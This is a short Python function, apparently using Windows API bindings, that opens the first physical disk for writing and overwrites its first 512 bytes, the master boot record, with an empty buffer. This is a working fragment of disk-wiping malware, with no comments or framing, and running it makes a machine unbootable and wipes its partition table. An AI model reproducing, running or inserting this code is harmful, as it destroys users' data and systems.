def mbr():
    hMBR = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE,   FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0)
    WriteFile(hMBR, AllocateReadBuffer(512), None)
    CloseHandle(hMBR)
